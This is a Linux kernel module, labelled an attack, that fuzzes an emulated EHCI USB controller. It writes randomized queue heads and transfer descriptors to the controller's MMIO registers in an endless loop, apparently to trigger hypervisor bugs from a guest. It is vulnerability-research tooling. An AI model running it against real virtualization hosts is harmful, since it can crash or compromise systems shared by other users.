#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>
#include <linux/random.h>

#define MEM_AREA 0xfebf1000

#define USBCMD           0x0000
#define USBCMD_RUNSTOP   (1 << 0)      // run / Stop
#define USBCMD_HCRESET   (1 << 1)      // HC Reset
#define USBCMD_FLS       (3 << 2)      // Frame List Size
#define USBCMD_FLS_SH    2             // Frame List Size Shift
#define USBCMD_PSE       (1 << 4)      // Periodic Schedule Enable
#define USBCMD_ASE       (1 << 5)      // Asynch Schedule Enable
#define USBCMD_IAAD      (1 << 6)      // Int Asynch Advance Doorbell
#define USBCMD_LHCR      (1 << 7)      // Light Host Controller Reset
#define USBCMD_ASPMC     (3 << 8)      // Async Sched Park Mode Count
#define USBCMD_ASPME     (1 << 11)     // Async Sched Park Mode Enable
#define USBCMD_ITC       (0x7f << 16)  // Int Threshold Control
#define USBCMD_ITC_SH    16            // Int Threshold Control Shift

typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;
#define QH_EPCHAR_RL_MASK             0xf0000000
#define QH_EPCHAR_RL_SH               28
#define QH_EPCHAR_C                   (1 << 27)
#define QH_EPCHAR_MPLEN_MASK          0x07FF0000
#define QH_EPCHAR_MPLEN_SH            16
#define QH_EPCHAR_H                   (1 << 15)
#define QH_EPCHAR_DTC                 (1 << 14)
#define QH_EPCHAR_EPS_MASK            0x00003000
#define QH_EPCHAR_EPS_SH              12
#define EHCI_QH_EPS_FULL              0
#define EHCI_QH_EPS_LOW               1
#define EHCI_QH_EPS_HIGH              2
#define EHCI_QH_EPS_RESERVED          3

#define QH_EPCHAR_EP_MASK             0x00000f00
#define QH_EPCHAR_EP_SH               8
#define QH_EPCHAR_I                   (1 << 7)
#define QH_EPCHAR_DEVADDR_MASK        0x0000007f
#define QH_EPCHAR_DEVADDR_SH          0

    /* endpoint capabilities */
    uint32_t epcap;
#define QH_EPCAP_MULT_MASK            0xc0000000
#define QH_EPCAP_MULT_SH              30
#define QH_EPCAP_PORTNUM_MASK         0x3f800000
#define QH_EPCAP_PORTNUM_SH           23
#define QH_EPCAP_HUBADDR_MASK         0x007f0000
#define QH_EPCAP_HUBADDR_SH           16
#define QH_EPCAP_CMASK_MASK           0x0000ff00
#define QH_EPCAP_CMASK_SH             8
#define QH_EPCAP_SMASK_MASK           0x000000ff
#define QH_EPCAP_SMASK_SH             0

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;
#define QH_ALTNEXT_NAKCNT_MASK        0x0000001e
#define QH_ALTNEXT_NAKCNT_SH          1

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */
#define BUFPTR_CPROGMASK_MASK         0x000000ff
#define BUFPTR_FRAMETAG_MASK          0x0000001f
#define BUFPTR_SBYTES_MASK            0x00000fe0
#define BUFPTR_SBYTES_SH              5
} EHCIqh;

typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;
#define QTD_TOKEN_DTOGGLE             (1 << 31)
#define QTD_TOKEN_TBYTES_MASK         0x7fff0000
#define QTD_TOKEN_TBYTES_SH           16
#define QTD_TOKEN_IOC                 (1 << 15)
#define QTD_TOKEN_CPAGE_MASK          0x00007000
#define QTD_TOKEN_CPAGE_SH            12
#define QTD_TOKEN_CERR_MASK           0x00000c00
#define QTD_TOKEN_CERR_SH             10
#define QTD_TOKEN_PID_MASK            0x00000300
#define QTD_TOKEN_PID_SH              8
#define QTD_TOKEN_ACTIVE              (1 << 7)
#define QTD_TOKEN_HALT                (1 << 6)
#define QTD_TOKEN_DBERR               (1 << 5)
#define QTD_TOKEN_BABBLE              (1 << 4)
#define QTD_TOKEN_XACTERR             (1 << 3)
#define QTD_TOKEN_MISSEDUF            (1 << 2)
#define QTD_TOKEN_SPLITXSTATE         (1 << 1)
#define QTD_TOKEN_PING                (1 << 0)

    uint32_t bufptr[5];               /* Standard buffer pointer */
#define QTD_BUFPTR_MASK               0xfffff000
#define QTD_BUFPTR_SH                 12
} EHCIqtd;

void *mem_base;
void *asyn_addr;
void *packet_1_base_addr;
void *packet_2_base_addr;

void init_malloc_area(void){
    mem_base = ioremap(MEM_AREA,0x1000);
    mem_base += 0x20;
    asyn_addr = kmalloc(0x4000,GFP_KERNEL);
    packet_1_base_addr = kmalloc(0x5000,GFP_KERNEL);
    packet_2_base_addr = kmalloc(0x5000,GFP_KERNEL);
    memset(asyn_addr,0,0x4000);
    memset(packet_1_base_addr,0,0x5000);
    memset(packet_2_base_addr,0,0x5000);
}

void set_usbcmd(u32 val){
    writel(val,mem_base);
}

void set_frindex(u32 val){
    val = val & 0x3fff;
    writel(val,mem_base+0xc);
}

void set_asynclistaddr(u32 val){
    writel(val,mem_base+0x18);
}

void set_usbsts(u32 val){
    writel(val,mem_base+0x4);
}

static int start_attack(void){
    u32 times;
    unsigned long tmp;
    EHCIqh *qh1;
    EHCIqh *qh2;
    EHCIqtd *qtd1;
    EHCIqtd *qtd2;
    init_malloc_area();
    times = 1;

    qh1 = asyn_addr;
    qh2 = asyn_addr + sizeof(EHCIqh);
    qtd1 = asyn_addr + 0x1000;
    qtd2 = asyn_addr + 0x1000 + sizeof(EHCIqtd);
    get_random_bytes(asyn_addr,0x4000);

    while(1){
        get_random_bytes(qh1,sizeof(EHCIqh));
        get_random_bytes(qh2,sizeof(EHCIqh));
        get_random_bytes(qtd1,sizeof(EHCIqtd));
        get_random_bytes(qtd2,sizeof(EHCIqtd));
        get_random_bytes(packet_1_base_addr,0x1000);
        get_random_bytes(packet_2_base_addr,0x1000);

        qh1->epchar |= QH_EPCHAR_H;

        get_random_bytes(&tmp,2);
        tmp = tmp >> 2;
        tmp = tmp & 0xc;
        tmp = tmp << 30;
        qh1->epcap |= tmp; //  q->transact_ctr
        qh1->epchar = qh1->epchar & ~QH_EPCHAR_DEVADDR_MASK; // find usb device
        qh1->epchar |= 0x2;
        
        qh1->next = 0;
        qh1->next = virt_to_phys(qh2) + 2;//set qh2
        
        get_random_bytes(&tmp,2);
        if(tmp%3 == 0){
            qh1->token |= QTD_TOKEN_HALT;
            qh1->epchar = qh1->epchar & ~QH_EPCHAR_DEVADDR_MASK; // find usb device
            qh1->epchar |= 0x0;

        }else if(tmp%3 == 1){
            qh1->token &= ~QTD_TOKEN_HALT;
            qh1->token |= QTD_TOKEN_ACTIVE;
            qh1->current_qtd = virt_to_phys(qtd1);
            qh1->current_qtd &= ~(1<<0);
            qh1->epchar = qh1->epchar & ~QH_EPCHAR_DEVADDR_MASK; // find usb device
            qh1->epchar |= 0x0;

            tmp = (qtd1->token & QTD_TOKEN_TBYTES_MASK) >> QTD_TOKEN_TBYTES_SH;
            if(tmp > 0x5000){
                tmp -= 0x5000;
            }
            qtd1->token &= ~QTD_TOKEN_TBYTES_MASK;
            qtd1->token |= (tmp << QTD_TOKEN_TBYTES_SH); //size <= BUFF_SIZE

            //set p.pid that not in case 3
            qtd1->token &= ~QTD_TOKEN_PID_MASK;
            get_random_bytes(&tmp,2);
            if((tmp%3) == 0){
                tmp = 0 << QTD_TOKEN_PID_SH;
            }else if((tmp%3) == 1){
                tmp = 1 << QTD_TOKEN_PID_SH;
            }else{
                tmp = 2 << QTD_TOKEN_PID_SH;
                qh1->epchar &= ~QH_EPCHAR_EP_MASK;
                qh1->epchar |= (0 << QH_EPCHAR_EP_SH);
            }
            qtd1->token |= tmp;

            // ehci_init_transfer
            qtd1->token &= ~QTD_TOKEN_CPAGE_MASK;
            qtd1->token |= (0 << QTD_TOKEN_CPAGE_SH); // cpage

            qtd1->bufptr[0] &= ~QTD_BUFPTR_MASK;
            qtd1->bufptr[0] |= virt_to_phys(packet_1_base_addr) & QTD_BUFPTR_MASK;
            qtd1->bufptr[1] &= ~QTD_BUFPTR_MASK;
            qtd1->bufptr[1] |= virt_to_phys(packet_1_base_addr+0x1000) & QTD_BUFPTR_MASK;
            qtd1->bufptr[2] &= ~QTD_BUFPTR_MASK;
            qtd1->bufptr[2] |= virt_to_phys(packet_1_base_addr+0x2000) & QTD_BUFPTR_MASK;
            qtd1->bufptr[3] &= ~QTD_BUFPTR_MASK;
            qtd1->bufptr[3] |= virt_to_phys(packet_1_base_addr+0x3000) & QTD_BUFPTR_MASK;
            qtd1->bufptr[4] = 0;
            qtd1->bufptr[4] |= virt_to_phys(packet_1_base_addr+0x4000) & QTD_BUFPTR_MASK;

            // set spd
            get_random_bytes(&tmp,2);
            qtd1->altnext = virt_to_phys(qtd2) | (tmp & 1);
            qtd1->next = virt_to_phys(qtd2);
        }else{
            qh1->token &= ~QTD_TOKEN_HALT;
            qh1->token &= ~QTD_TOKEN_ACTIVE;
            
            qh1->epchar = qh1->epchar & ~QH_EPCHAR_DEVADDR_MASK; // find usb device
            qh1->epchar |= 0x0;

            get_random_bytes(&tmp,5);
            if((tmp%3) == 0){
                qh1->altnext_qtd = virt_to_phys(qtd2);
            }else{
                qh1->altnext_qtd |= 1;
                qh1->next_qtd = virt_to_phys(qtd2);
            }
        }

        //qh2 and qtd2
        //ehci_state_fetchqh
        get_random_bytes(&tmp,2);
        if((tmp%3) == 0){
            qh2->epchar |= QH_EPCHAR_H;
        }
        else{
            qh2->epchar &= ~QH_EPCHAR_H;
        }

        get_random_bytes(&tmp,2);
        tmp = tmp >> 2;
        tmp = tmp & 0xc;
        tmp = tmp << 30;
        qh2->epcap |= tmp; //  q->transact_ctr
        qh2->epchar = qh2->epchar & ~QH_EPCHAR_DEVADDR_MASK; // find usb device
        qh2->epchar |= 0x0;

        //set next qh
        get_random_bytes(&tmp,2);
        if((tmp%3) == 0){
            qh2->next = 0;
            qh2->next = virt_to_phys(qh2);//set qh2
        }else if((tmp%3) == 1){
            //do nothing,do not set the qh->next.
        }else{
            qh2->next = 0;
            qh2->next = virt_to_phys(qh2) + 2;
        }

        get_random_bytes(&tmp,2);
        if((tmp%4) == 0){
            qh2->token |= QTD_TOKEN_HALT; // get into HORIZONTALQH
        }else if((tmp%4) == 1){
            qh2->token &= ~QTD_TOKEN_HALT;
            qh2->token &= ~QTD_TOKEN_ACTIVE; // get into ADVANCEQUEUE

            get_random_bytes(&tmp,5);
            if((tmp%3) == 0){
                qh2->altnext_qtd = virt_to_phys(qtd1) | 1;
            }else if((tmp%3) == 1){
                qh2->altnext_qtd |= 1;
                qh2->next_qtd = virt_to_phys(qtd1) | 1;
            }else{
                //do nothing.
            }
        }else{
            qh2->token &= ~QTD_TOKEN_HALT;
            qh2->token |= QTD_TOKEN_ACTIVE; // get into FETCHQTD

            qh2->current_qtd = virt_to_phys(qtd2);
            qh2->current_qtd &= ~(1<<0);

            qtd2->token |= QTD_TOKEN_ACTIVE;

            tmp = (qtd2->token & QTD_TOKEN_TBYTES_MASK) >> QTD_TOKEN_TBYTES_SH;
            if(tmp > 0x5000){
                tmp -= 0x5000;
            }
            qtd2->token &= ~QTD_TOKEN_TBYTES_MASK;
            qtd2->token |= (tmp << QTD_TOKEN_TBYTES_SH); //size <= BUFF_SIZE

            //set p.pid
            qtd2->token &= ~QTD_TOKEN_PID_MASK;
            get_random_bytes(&tmp,2);
            if((tmp%3) == 0){
                tmp = 0 << QTD_TOKEN_PID_SH;
            }else if((tmp%3) == 1){
                tmp = 1 << QTD_TOKEN_PID_SH;
            }else{
                tmp = 2 << QTD_TOKEN_PID_SH;
                qh2->epchar &= ~QH_EPCHAR_EP_MASK;
                qh2->epchar |= (0 << QH_EPCHAR_EP_SH);
            }
            qtd2->token |= tmp;

            //ehci_init_transfer
            get_random_bytes(&tmp,2);
            qtd2->token &= ~QTD_TOKEN_CPAGE_MASK;
            qtd2->token |= ((tmp%7) << QTD_TOKEN_CPAGE_SH); // cpage

            qtd2->bufptr[0] &= ~QTD_BUFPTR_MASK;
            qtd2->bufptr[0] |= virt_to_phys(packet_2_base_addr) & QTD_BUFPTR_MASK;
            qtd2->bufptr[1] &= ~QTD_BUFPTR_MASK;
            qtd2->bufptr[1] |= virt_to_phys(packet_2_base_addr+0x1000) & QTD_BUFPTR_MASK;
            qtd2->bufptr[2] &= ~QTD_BUFPTR_MASK;
            qtd2->bufptr[2] |= virt_to_phys(packet_2_base_addr+0x2000) & QTD_BUFPTR_MASK;
            qtd2->bufptr[3] &= ~QTD_BUFPTR_MASK;
            qtd2->bufptr[3] |= virt_to_phys(packet_2_base_addr+0x3000) & QTD_BUFPTR_MASK;
            qtd2->bufptr[4] &= ~QTD_BUFPTR_MASK; //maybe crash
            qtd2->bufptr[4] |= virt_to_phys(packet_2_base_addr+0x4000) & QTD_BUFPTR_MASK;

            //set spd
            get_random_bytes(&tmp,3);
            qtd2->altnext = virt_to_phys(qtd2) | 1;//(tmp & 1);
            if((tmp%4) == 0){
                //do nothing
            }else{
                qtd2->next = virt_to_phys(qtd2) | 1;
            }
        }

        printk("---------------------------------------------%d------------------------------------------------------\n",times);
        printk("the QH1 struct:           the QH2 struct:           the qTD1 struct:        the qTD2 struct:\n");
        printk("next       :0x%x          next       :0x%x          next     :0x%x          next     :0x%x\n",qh1->next,qh2->next,qtd1->next,qtd2->next);
        printk("epchar     :0x%x          epchar     :0x%x          altnext  :0x%x          altnext  :0x%x\n",qh1->epchar,qh2->epchar,qtd1->altnext,qtd2->altnext);
        printk("epcap      :0x%x          epcap      :0x%x          token    :0x%x          token    :0x%x\n",qh1->epcap,qh2->epcap,qtd1->token,qtd2->token);
        printk("current_qtd:0x%x          current_qtd:0x%x          bufptr[0]:0x%x          bufptr[0]:0x%x\n",qh1->current_qtd,qh2->current_qtd,qtd1->bufptr[0],qtd2->bufptr[0]);
        printk("next_qtd   :0x%x          next_qtd   :0x%x\n",qh1->next_qtd,qh2->next_qtd);
        printk("altnext_qtd:0x%x          altnext_qtd:0x%x\n",qh1->altnext_qtd,qh2->altnext_qtd);
        printk("token      :0x%x          token      :0x%x\n",qh1->token,qh2->token);
        printk("bufptr[0]  :0x%x          bufptr[0]  :0x%x\n",qh1->bufptr[0],qh2->bufptr[0]);
        printk("-----------------------------------------------------------------------------------------------------\n\n\n");

        set_frindex(0x0);
        set_asynclistaddr(virt_to_phys(asyn_addr));
        set_usbcmd(USBCMD_RUNSTOP | USBCMD_ASE);

        mdelay(3000);//时间会影响fuzz，过快会导致数据传输不稳定
        times += 1;
    }
    return 0;
}

static void exit_attack(void){
    printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");